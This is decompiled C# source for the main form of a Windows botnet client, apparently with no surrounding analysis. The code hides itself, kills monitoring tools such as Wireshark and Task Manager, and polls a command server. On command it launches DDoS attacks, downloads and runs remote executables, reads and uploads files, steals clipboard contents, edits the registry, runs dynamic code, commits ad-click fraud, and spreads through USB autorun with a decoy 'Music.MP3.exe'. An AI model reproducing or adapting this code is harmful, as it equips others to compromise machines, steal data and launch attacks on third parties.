using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using a.My;

namespace a;

[DesignerGenerated]
public class MainForm : Form
{
	private IContainer components;

	[AccessedThroughProperty("MainTimer")]
	private Timer _MainTimer;

	[AccessedThroughProperty("CheckProssTimer")]
	private Timer _CheckProssTimer;

	private bool USBSpreadThreadIsRunning;

	private const long KEYEVENTF_KEYUP = 2L;

	internal virtual Timer MainTimer
	{
		get
		{
			return _MainTimer;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = MainTimer_Tick;
			if (_MainTimer != null)
			{
				_MainTimer.remove_Tick(eventHandler);
			}
			_MainTimer = value;
			if (_MainTimer != null)
			{
				_MainTimer.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer CheckProssTimer
	{
		get
		{
			return _CheckProssTimer;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = CheckProssTimer_Tick;
			if (_CheckProssTimer != null)
			{
				_CheckProssTimer.remove_Tick(eventHandler);
			}
			_CheckProssTimer = value;
			if (_CheckProssTimer != null)
			{
				_CheckProssTimer.add_Tick(eventHandler);
			}
		}
	}

	public MainForm()
	{
		((Form)this).add_Load((EventHandler)MainForm_Load);
		USBSpreadThreadIsRunning = false;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		components = new Container();
		MainTimer = new Timer(components);
		CheckProssTimer = new Timer(components);
		((Control)this).SuspendLayout();
		MainTimer.set_Interval(10000);
		CheckProssTimer.set_Enabled(true);
		CheckProssTimer.set_Interval(10000);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(364, 202);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("MainForm");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).ResumeLayout(false);
	}

	private void MainForm_Load(object sender, EventArgs e)
	{
		try
		{
			MainTimer.set_Interval(Conversions.ToInteger(Config.MainLoopInitival));
			if (Config.Debug)
			{
				MainTimer.set_Interval(Conversions.ToInteger("25000"));
			}
			Config.ProsNotAllowed.get_Items().Add((object)"wpe pro");
			Config.ProsNotAllowed.get_Items().Add((object)"wireshark");
			Config.ProsNotAllowed.get_Items().Add((object)"taskmgr");
			Config.ProsNotAllowed.get_Items().Add((object)"netstat");
			Config.ProsNotAllowed.get_Items().Add((object)"sniff");
			Config.ProsNotAllowed.get_Items().Add((object)"packet");
			Config.ProsNotAllowed.get_Items().Add((object)"sandbox");
			Control.set_CheckForIllegalCrossThreadCalls(false);
			CheckProcesses.Check();
			if (!Config.Debug)
			{
				try
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().GetFileInfo(Application.get_ExecutablePath()).Attributes = FileAttributes.Hidden | FileAttributes.System;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			while (Operators.ConditionalCompareObjectEqual(WEB.connect(), (object)false, false))
			{
				Thread.Sleep(Conversions.ToInteger(Config.SleepInitival));
			}
			MainTimer.Start();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.EndApp();
			ProjectData.ClearProjectError();
		}
	}

	private void MainTimer_Tick(object sender, EventArgs e)
	{
		checked
		{
			try
			{
				string text = Conversions.ToString(WEB.ReadCommando());
				if (Operators.CompareString(text, "reg", false) == 0)
				{
					ResetAndConnect();
					return;
				}
				try
				{
					if (!Config.Debug)
					{
						MainTimer.set_Interval(Conversions.ToInteger(text.Split(new char[1] { '\n' })[0].Replace("\n", "")));
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				if (Operators.CompareString(text, "", false) == 0)
				{
					return;
				}
				string[] array = text.Split(new char[1] { '\n' })[1].Split(new char[1] { '|' });
				long num = 0L;
				while (num != array.Length)
				{
					if (Config.notagainlist.Contains(array[(int)num]))
					{
						num++;
						continue;
					}
					if (!array[(int)num].EndsWith("R;"))
					{
						Config.notagainlist.Add(array[(int)num]);
					}
					array[(int)num] = Strings.Replace(array[(int)num], "\n", "", 1, -1, (CompareMethod)0);
					CheckAction(array[(int)num], array[(int)num].Split(new char[1] { ';' }));
					num++;
				}
				array = null;
				text = "";
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				Process[] processes = Process.GetProcesses();
				int num2 = processes.Length - 1;
				for (int i = 0; i <= num2; i++)
				{
					if (Operators.CompareString(Strings.UCase(processes[i].ProcessName), Strings.UCase("dogs"), false) == 0)
					{
						processes[i].Kill();
					}
				}
				ProjectData.ClearProjectError();
			}
		}
	}

	public void CheckAction(string Commando, string[] args)
	{
		//IL_0b3f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b46: Expected O, but got Unknown
		//IL_0b50: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b5a: Expected O, but got Unknown
		//IL_0bbc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bc3: Expected O, but got Unknown
		//IL_0d93: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d9a: Expected O, but got Unknown
		checked
		{
			try
			{
				if (Commando.ToString().StartsWith("ddos;"))
				{
					try
					{
						if (Operators.CompareString(args[2], "start", false) == 0)
						{
							Interaction.Shell("\"" + Config.FolderPath + "dogs.exe\" " + Commando, (AppWinStyle)0, false, -1);
							WEB.SendSucsess();
						}
						if (Operators.CompareString(args[2], "stop", false) == 0)
						{
							try
							{
								Process[] processes = Process.GetProcesses();
								int num = processes.Length - 1;
								for (int i = 0; i <= num; i++)
								{
									if (Operators.CompareString(Strings.UCase(processes[i].ProcessName), Strings.UCase("dogs"), false) == 0)
									{
										processes[i].Kill();
									}
								}
							}
							catch (Exception projectError)
							{
								ProjectData.SetProjectError(projectError);
								ProjectData.ClearProjectError();
							}
							WEB.SendSucsess();
						}
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						WEB.SendError();
						ProjectData.ClearProjectError();
					}
				}
				if (Commando.StartsWith("download;"))
				{
					try
					{
						Thread.Sleep((int)Math.Round(Conversion.Int(VBMath.Rnd() * 900000f)));
						if (Operators.CompareString(args[3], "1", false) == 0)
						{
							((ServerComputer)MyProject.Computer).get_Network().DownloadFile(args[1], args[2]);
							Interaction.Shell(args[2], (AppWinStyle)0, false, -1);
						}
						else
						{
							((ServerComputer)MyProject.Computer).get_Network().DownloadFile(args[1], args[2]);
						}
						WEB.SendSucsess();
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						WEB.SendError();
						ProjectData.ClearProjectError();
					}
				}
				if (Commando.StartsWith("username;"))
				{
					try
					{
						WEB.SendComment(Environment.UserName);
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						WEB.SendError();
						ProjectData.ClearProjectError();
					}
				}
				if (Commando.StartsWith("info;"))
				{
					try
					{
						WEB.SendComment(((ServerComputer)MyProject.Computer).get_Info().get_InstalledUICulture().IetfLanguageTag.ToString() + "|" + ((ServerComputer)MyProject.Computer).get_Info().get_OSFullName());
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						WEB.SendError();
						ProjectData.ClearProjectError();
					}
				}
				if (Commando.StartsWith("update;"))
				{
					try
					{
						long num2 = Conversions.ToLong(args[2]);
						long num3 = Conversions.ToLong(Config.BotVer);
						if (num2 > num3)
						{
							Thread.Sleep((int)Math.Round(Conversion.Int(VBMath.Rnd() * 900000f)));
							try
							{
								((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Config.UpdateFile);
							}
							catch (Exception projectError6)
							{
								ProjectData.SetProjectError(projectError6);
								ProjectData.ClearProjectError();
							}
							if (Config.Debug)
							{
								VBMath.Randomize();
								Config.UpdateFile = Config.UpdateFile + Conversion.Int(VBMath.Rnd() * 100000f) + ".exe";
								((ServerComputer)MyProject.Computer).get_Network().DownloadFile(args[1], Config.UpdateFile);
							}
							else
							{
								((ServerComputer)MyProject.Computer).get_Network().DownloadFile(args[1], Config.UpdateFile);
							}
							if (Operators.CompareString(method_0(Config.UpdateFile), args[3], false) != 0)
							{
								WEB.SendError();
								return;
							}
							try
							{
								RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Config.RegStartup.Substring(Config.RegStartup.IndexOf("\\") + 1, Config.RegStartup.Length - (Config.RegStartup.IndexOf("\\") + 1)), writable: true);
								registryKey.DeleteValue(Config.RegName, throwOnMissingValue: true);
								registryKey.Close();
							}
							catch (Exception projectError7)
							{
								ProjectData.SetProjectError(projectError7);
								ProjectData.ClearProjectError();
							}
							WEB.SendSucsess();
							Thread.Sleep(5000);
							Interaction.Shell(Config.UpdateFile, (AppWinStyle)2, false, -1);
							ProjectData.EndApp();
						}
					}
					catch (Exception projectError8)
					{
						ProjectData.SetProjectError(projectError8);
						WEB.SendError();
						ProjectData.ClearProjectError();
					}
				}
				if (Commando.StartsWith("remove;"))
				{
					try
					{
						RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey(Config.RegStartup.Substring(Config.RegStartup.IndexOf("\\") + 1, Config.RegStartup.Length - (Config.RegStartup.IndexOf("\\") + 1)), writable: true);
						registryKey2.DeleteValue(Config.RegName, throwOnMissingValue: true);
						registryKey2.Close();
						try
						{
							if (Config.TryCopToStartFolder)
							{
								string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
								((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(folderPath + "\\" + Config.StartupFolderExeName);
							}
						}
						catch (Exception projectError9)
						{
							ProjectData.SetProjectError(projectError9);
							ProjectData.ClearProjectError();
						}
						WEB.SendSucsess();
						Thread.Sleep(2000);
						try
						{
							string text = "";
							int num4 = 0;
							do
							{
								text += "ping 127.0.0.1\r\n";
								num4++;
							}
							while (num4 <= 200);
							text = text + "del \"" + Config.FilePath + "\"";
							try
							{
								((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("del.bat");
								((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText("del.bat", text, false);
								Interaction.Shell("del.bat", (AppWinStyle)0, false, -1);
							}
							catch (Exception projectError10)
							{
								ProjectData.SetProjectError(projectError10);
								ProjectData.ClearProjectError();
							}
						}
						catch (Exception projectError11)
						{
							ProjectData.SetProjectError(projectError11);
							ProjectData.ClearProjectError();
						}
						ProjectData.EndApp();
					}
					catch (Exception projectError12)
					{
						ProjectData.SetProjectError(projectError12);
						WEB.SendError();
						ProjectData.ClearProjectError();
					}
				}
				if (Commando.StartsWith("run;"))
				{
					try
					{
						Interaction.Shell(args[1], (AppWinStyle)2, false, -1);
						WEB.SendSucsess();
					}
					catch (Exception projectError13)
					{
						ProjectData.SetProjectError(projectError13);
						WEB.SendError();
						ProjectData.ClearProjectError();
					}
				}
				if (Commando.StartsWith("upload;"))
				{
					try
					{
						((ServerComputer)MyProject.Computer).get_Network().UploadFile(args[1], args[2], args[3], args[4]);
						WEB.SendSucsess();
					}
					catch (Exception projectError14)
					{
						ProjectData.SetProjectError(projectError14);
						WEB.SendError();
						ProjectData.ClearProjectError();
					}
				}
				if (Commando.StartsWith("readfile;"))
				{
					try
					{
						WEB.SendComment(((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(args[1]));
					}
					catch (Exception projectError15)
					{
						ProjectData.SetProjectError(projectError15);
						WEB.SendError();
						ProjectData.ClearProjectError();
					}
				}
				if (Commando.StartsWith("writefile;"))
				{
					try
					{
						((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(args[1], args[2], false);
						WEB.SendSucsess();
					}
					catch (Exception projectError16)
					{
						ProjectData.SetProjectError(projectError16);
						WEB.SendError();
						ProjectData.ClearProjectError();
					}
				}
				if (Commando.StartsWith("kill;"))
				{
					try
					{
						Process[] processes2 = Process.GetProcesses();
						int num5 = processes2.Length - 1;
						for (int j = 0; j <= num5; j++)
						{
							if (Operators.CompareString(Strings.UCase(processes2[j].ProcessName), Strings.UCase(args[1].ToLower()), false) == 0)
							{
								processes2[j].Kill();
							}
						}
						WEB.SendSucsess();
					}
					catch (Exception projectError17)
					{
						ProjectData.SetProjectError(projectError17);
						WEB.SendError();
						ProjectData.ClearProjectError();
					}
				}
				if (Commando.StartsWith("regread;"))
				{
					try
					{
						WEB.SendComment(Conversions.ToString(((ServerComputer)MyProject.Computer).get_Registry().GetValue(args[1], args[2], (object)"")));
					}
					catch (Exception projectError18)
					{
						ProjectData.SetProjectError(projectError18);
						WEB.SendError();
						ProjectData.ClearProjectError();
					}
				}
				if (Commando.StartsWith("regwrite;"))
				{
					try
					{
						((ServerComputer)MyProject.Computer).get_Registry().SetValue(args[1], args[2], (object)args[3]);
						WEB.SendSucsess();
					}
					catch (Exception projectError19)
					{
						ProjectData.SetProjectError(projectError19);
						WEB.SendError();
						ProjectData.ClearProjectError();
					}
				}
				if (Commando.StartsWith("ip;"))
				{
					try
					{
						WebClient webClient = new WebClient();
						byte[] bytes = webClient.DownloadData("http://whatismyip.akamai.com/");
						string @string = Encoding.ASCII.GetString(bytes);
						WEB.SendComment(@string);
					}
					catch (Exception projectError20)
					{
						ProjectData.SetProjectError(projectError20);
						WEB.SendError();
						ProjectData.ClearProjectError();
					}
				}
				if (Commando.StartsWith("lip;"))
				{
					try
					{
						WEB.SendComment(Dns.GetHostAddresses(((ServerComputer)MyProject.Computer).get_Name())[0].ToString());
					}
					catch (Exception projectError21)
					{
						ProjectData.SetProjectError(projectError21);
						WEB.SendError();
						ProjectData.ClearProjectError();
					}
				}
				if (Commando.StartsWith("getclip;"))
				{
					try
					{
						if (Operators.CompareString(((Computer)MyProject.Computer).get_Clipboard().GetText(), "", false) != 0)
						{
							WEB.SendComment(((Computer)MyProject.Computer).get_Clipboard().GetText());
						}
					}
					catch (Exception projectError22)
					{
						ProjectData.SetProjectError(projectError22);
						WEB.SendError();
						ProjectData.ClearProjectError();
					}
				}
				if (Commando.StartsWith("setclip;"))
				{
					try
					{
						((Computer)MyProject.Computer).get_Clipboard().SetText(args[1]);
						WEB.SendSucsess();
					}
					catch (Exception projectError23)
					{
						ProjectData.SetProjectError(projectError23);
						WEB.SendError();
						ProjectData.ClearProjectError();
					}
				}
				if (Commando.StartsWith("notrep;"))
				{
					try
					{
						Config.notagainlist.Clear();
						WEB.SendSucsess();
					}
					catch (Exception projectError24)
					{
						ProjectData.SetProjectError(projectError24);
						WEB.SendError();
						ProjectData.ClearProjectError();
					}
				}
				if (Commando.StartsWith("die;"))
				{
					ProjectData.EndApp();
				}
				if (Commando.StartsWith("openurl;"))
				{
					try
					{
						if (args[1].StartsWith("http://") | args[1].StartsWith("https://"))
						{
							Process.Start(args[1]);
							WEB.SendSucsess();
						}
						else
						{
							WEB.SendError();
						}
					}
					catch (Exception projectError25)
					{
						ProjectData.SetProjectError(projectError25);
						WEB.SendError();
						ProjectData.ClearProjectError();
					}
				}
				if (Commando.StartsWith("restart;"))
				{
					try
					{
						Interaction.Shell(Config.FilePath, (AppWinStyle)2, false, -1);
						WEB.SendSucsess();
						ProjectData.EndApp();
					}
					catch (Exception projectError26)
					{
						ProjectData.SetProjectError(projectError26);
						WEB.SendError();
						ProjectData.ClearProjectError();
					}
				}
				if (Commando.StartsWith("removeifcon;"))
				{
					try
					{
						WebClient webClient2 = new WebClient();
						webClient2.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
						byte[] bytes2 = webClient2.DownloadData("http://www.geobytes.com/ipLocator.htm");
						string string2 = Encoding.ASCII.GetString(bytes2);
						if (string2.Contains("ro-no_bots_pls13\" value=\"" + args[1]))
						{
							RegistryKey registryKey3 = Registry.CurrentUser.OpenSubKey(Config.RegStartup.Substring(Config.RegStartup.IndexOf("\\") + 1, Config.RegStartup.Length - (Config.RegStartup.IndexOf("\\") + 1)), writable: true);
							registryKey3.DeleteValue(Config.RegName, throwOnMissingValue: true);
							registryKey3.Close();
							try
							{
								if (Config.TryCopToStartFolder)
								{
									string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
									((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(folderPath2 + "\\" + Config.StartupFolderExeName);
								}
							}
							catch (Exception projectError27)
							{
								ProjectData.SetProjectError(projectError27);
								ProjectData.ClearProjectError();
							}
							WEB.SendSucsess();
							Thread.Sleep(2000);
							string text2 = "";
							int num6 = 0;
							do
							{
								text2 += "ping 127.0.0.1\r\n";
								num6++;
							}
							while (num6 <= 200);
							text2 = text2 + "del \"" + Config.FilePath + "\"";
							try
							{
								((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("del.bat");
								((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText("del.bat", text2, false);
								Interaction.Shell("del.bat", (AppWinStyle)0, false, -1);
							}
							catch (Exception projectError28)
							{
								ProjectData.SetProjectError(projectError28);
								ProjectData.ClearProjectError();
							}
							ProjectData.EndApp();
						}
					}
					catch (Exception projectError29)
					{
						ProjectData.SetProjectError(projectError29);
						WEB.SendError();
						ProjectData.ClearProjectError();
					}
				}
				if (Commando.StartsWith("del;"))
				{
					try
					{
						((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(args[1]);
						WEB.SendSucsess();
					}
					catch (Exception projectError30)
					{
						ProjectData.SetProjectError(projectError30);
						WEB.SendError();
						ProjectData.ClearProjectError();
					}
				}
				if (Commando.StartsWith("spread;") && Operators.CompareString(args[1], "usb", false) == 0 && !USBSpreadThreadIsRunning)
				{
					Thread thread = new Thread(method_1);
					thread.Start();
					USBSpreadThreadIsRunning = true;
					WEB.SendSucsess();
				}
				if (Commando.StartsWith("check;"))
				{
					WebClient webClient3 = new WebClient();
					webClient3.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
					string string3 = Encoding.ASCII.GetString(webClient3.DownloadData(args[1]));
					CheckAction(string3, string3.Split(new char[1] { ';' }));
					WEB.SendSucsess();
				}
				if (Commando.StartsWith("adclick;"))
				{
					WebBrowser val = new WebBrowser();
					val.add_Navigating(new WebBrowserNavigatingEventHandler(WebBrowser1_Navigating));
					val.Navigate(args[1]);
					int num7 = 0;
					do
					{
						Application.DoEvents();
						Thread.Sleep(1);
						num7++;
					}
					while (num7 <= 2000);
					while (val.get_IsBusy() && !val.get_DocumentText().Contains("</html>"))
					{
						Application.DoEvents();
						Thread.Sleep(1);
					}
					if (Config.links.Count != 0)
					{
						WebBrowser val2 = new WebBrowser();
						object[] array = new object[1];
						object[] array2 = array;
						ArrayList links = Config.links;
						float num8 = Conversion.Int(VBMath.Rnd() * (float)Config.links.Count - 1f);
						array2[0] = RuntimeHelpers.GetObjectValue(links[(int)Math.Round(num8)]);
						object[] array3 = array;
						object[] array4 = array3;
						bool[] array5 = new bool[1] { true };
						NewLateBinding.LateCall((object)val2, (Type)null, "Navigate", array4, (string[])null, (Type[])null, array5, true);
						if (array5[0])
						{
							links[(int)Math.Round(num8)] = RuntimeHelpers.GetObjectValue(array3[0]);
						}
						int num9 = 0;
						do
						{
							Thread.Sleep(1);
							Application.DoEvents();
							num9++;
						}
						while (num9 <= 2000);
						ArrayList arrayList = new ArrayList();
						int num10 = val.get_Document().get_Links().get_Count() - 1;
						for (int k = 0; k <= num10; k++)
						{
							if (val.get_Document().get_Links().get_Item(k)
								.GetAttribute("href")
								.Contains("&ai="))
							{
								arrayList.Add(k.ToString());
							}
						}
						Random random = new Random();
						VBMath.Randomize((double)random.Next());
						NewLateBinding.LateCall(NewLateBinding.LateGet((object)val2.get_Document().get_Links(), (Type)null, "Item", new object[1] { RuntimeHelpers.GetObjectValue(arrayList[(int)Math.Round(Conversion.Int(VBMath.Rnd() * (float)arrayList.Count - 1f))]) }, (string[])null, (Type[])null, (bool[])null), (Type)null, "InvokeMember", new object[1] { "click" }, (string[])null, (Type[])null, (bool[])null, true);
						int num11 = 0;
						do
						{
							Thread.Sleep(1);
							Application.DoEvents();
							num11++;
						}
						while (num11 <= 2000);
						WEB.SendSucsess();
					}
					else
					{
						WEB.SendError();
					}
				}
				if (Commando.StartsWith("advisit;"))
				{
					WebBrowser val3 = new WebBrowser();
					val3.Navigate(args[1]);
					int num12 = 0;
					do
					{
						Application.DoEvents();
						Thread.Sleep(1);
						num12++;
					}
					while (num12 <= 500);
					while (!((Control)val3).get_IsAccessible())
					{
						Application.DoEvents();
						Thread.Sleep(1);
					}
					WEB.SendSucsess();
				}
				if (Commando.StartsWith("youtube;"))
				{
					Thread thread2 = new Thread(delegate(object a0)
					{
						youtube(Conversions.ToString(a0));
					});
					thread2.SetApartmentState(ApartmentState.STA);
					thread2.Start(args[1] + ";" + args[2] + ";" + args[3] + ";");
					WEB.SendSucsess();
				}
				if (Commando.StartsWith("silent;"))
				{
					if (Operators.CompareString(args[1], "true", false) == 0)
					{
						Config.silent = true;
						WEB.SendSucsess();
					}
					else if (Operators.CompareString(args[1], "false", false) == 0)
					{
						Config.silent = false;
						WEB.SendError();
					}
				}
				if (Commando.StartsWith("dynamicmodule;"))
				{
					string text3 = DynamicCode.runcode(args[1]).ToString();
					if (Operators.CompareString(text3, "0", false) == 0)
					{
						WEB.SendSucsess();
					}
					else
					{
						WEB.SendComment(text3);
					}
				}
				Commando = "";
				args = null;
			}
			catch (Exception projectError31)
			{
				ProjectData.SetProjectError(projectError31);
				try
				{
					WEB.SendError();
				}
				catch (Exception projectError32)
				{
					ProjectData.SetProjectError(projectError32);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern void keybd_event(byte bVk, byte bScan, int dwFlags, int dwExtraInfo);

	public void mute()
	{
		while (true)
		{
			Thread.Sleep(1);
			Application.DoEvents();
			keybd_event(174, 0, 0, 0);
		}
	}

	public void youtube(string args)
	{
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0045: Expected O, but got Unknown
		Thread thread = new Thread(mute);
		thread.Start();
		int num = Conversions.ToInteger(args.Split(new char[1] { ';' })[1]);
		checked
		{
			for (int i = 0; i <= num; i++)
			{
				WebBrowser val = new WebBrowser();
				val.Navigate(args.Split(new char[1] { ';' })[0]);
				int num2 = 0;
				do
				{
					Thread.Sleep(1);
					Application.DoEvents();
					num2++;
				}
				while (num2 <= 2000);
				DateTime t = DateTime.Now.AddMinutes(Conversions.ToDouble(args.Split(new char[1] { ';' })[2]));
				while (DateTime.Compare(DateTime.Now, t) <= 0)
				{
					Thread.Sleep(1);
					Application.DoEvents();
				}
			}
			thread.Abort();
		}
	}

	public void WebBrowser1_Navigating(object sender, WebBrowserNavigatingEventArgs e)
	{
		if (e.get_Url().AbsoluteUri.Contains("googleads"))
		{
			((CancelEventArgs)(object)e).Cancel = true;
			int num = 0;
			do
			{
				((CancelEventArgs)(object)e).Cancel = true;
				Thread.Sleep(1);
				Application.DoEvents();
				num = checked(num + 1);
			}
			while (num <= 2500);
			if (e.get_Url().AbsoluteUri.Contains("ads?client="))
			{
				Config.links.Add(e.get_Url().AbsoluteUri);
			}
		}
	}

	public string method_0(string filepath)
	{
		using FileStream inputStream = new FileStream(filepath, FileMode.Open, FileAccess.Read);
		using MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] arrInput = mD5CryptoServiceProvider.ComputeHash(inputStream);
		return ByteArrayToString(arrInput);
	}

	private string ByteArrayToString(byte[] arrInput)
	{
		checked
		{
			StringBuilder stringBuilder = new StringBuilder(arrInput.Length * 2);
			int num = arrInput.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				stringBuilder.Append(arrInput[i].ToString("X2"));
			}
			return stringBuilder.ToString().ToLower();
		}
	}

	public void ResetAndConnect()
	{
		try
		{
			MainTimer.Stop();
			while (Operators.ConditionalCompareObjectEqual(WEB.connect(), (object)false, false))
			{
				Thread.Sleep(Conversions.ToInteger(Config.SleepInitival));
			}
			MainTimer.Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void CheckProssTimer_Tick(object sender, EventArgs e)
	{
		try
		{
			CheckProcesses.Check();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_1()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		checked
		{
			while (true)
			{
				try
				{
					ListBox val = new ListBox();
					for (int i = 0; i != ((ServerComputer)MyProject.Computer).get_FileSystem().get_Drives().Count; i++)
					{
						if (((ServerComputer)MyProject.Computer).get_FileSystem().get_Drives()[i].DriveType == DriveType.Removable)
						{
							val.get_Items().Add((object)((ServerComputer)MyProject.Computer).get_FileSystem().get_Drives()[i].ToString());
						}
					}
					for (int i = 0; i != val.get_Items().get_Count(); i++)
					{
						try
						{
							try
							{
								((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Conversions.ToString(Operators.AddObject(val.get_Items().get_Item(i), (object)"usb.exe")));
							}
							catch (Exception projectError)
							{
								ProjectData.SetProjectError(projectError);
								ProjectData.ClearProjectError();
							}
							try
							{
								((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Conversions.ToString(Operators.AddObject(val.get_Items().get_Item(i), (object)"autorun.inf")));
							}
							catch (Exception projectError2)
							{
								ProjectData.SetProjectError(projectError2);
								ProjectData.ClearProjectError();
							}
							try
							{
								((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Conversions.ToString(Operators.AddObject(val.get_Items().get_Item(i), (object)"usb.exe")), true);
							}
							catch (Exception projectError3)
							{
								ProjectData.SetProjectError(projectError3);
								ProjectData.ClearProjectError();
							}
							try
							{
								((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Conversions.ToString(Operators.AddObject(val.get_Items().get_Item(i), (object)"Music.MP3.exe")), true);
							}
							catch (Exception projectError4)
							{
								ProjectData.SetProjectError(projectError4);
								ProjectData.ClearProjectError();
							}
							try
							{
								File.SetCreationTime(Conversions.ToString(Operators.AddObject(val.get_Items().get_Item(i), (object)"usb.exe")), DateTime.Parse("11.11.2009 18:15:51"));
							}
							catch (Exception projectError5)
							{
								ProjectData.SetProjectError(projectError5);
								ProjectData.ClearProjectError();
							}
							FileSystem.FileOpen(1, Conversions.ToString(Operators.AddObject(val.get_Items().get_Item(i), (object)"autorun.inf")), (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
							FileSystem.FilePut(1, "[autorun]\r\n", -1L, false);
							FileSystem.FilePut(1, "shellexecute=usb.exe\r\n", -1L, false);
							FileSystem.FilePut(1, "action=Click \"OK\" to enable USB flash drive\r\n", -1L, false);
							FileSystem.FilePut(1, "shell\\open\\command=usb.exe\r\n", -1L, false);
							FileSystem.FileClose(new int[1] { 1 });
							try
							{
								((ServerComputer)MyProject.Computer).get_FileSystem().GetFileInfo(Conversions.ToString(Operators.AddObject(val.get_Items().get_Item(i), (object)"usb.exe"))).Attributes = FileAttributes.Hidden | FileAttributes.System;
								((ServerComputer)MyProject.Computer).get_FileSystem().GetFileInfo(Conversions.ToString(Operators.AddObject(val.get_Items().get_Item(i), (object)"autorun.inf"))).Attributes = FileAttributes.Hidden | FileAttributes.System;
							}
							catch (Exception projectError6)
							{
								ProjectData.SetProjectError(projectError6);
								ProjectData.ClearProjectError();
							}
						}
						catch (Exception projectError7)
						{
							ProjectData.SetProjectError(projectError7);
							ProjectData.ClearProjectError();
						}
					}
				}
				catch (Exception projectError8)
				{
					ProjectData.SetProjectError(projectError8);
					ProjectData.ClearProjectError();
				}
				Thread.Sleep(5000);
			}
		}
	}
}
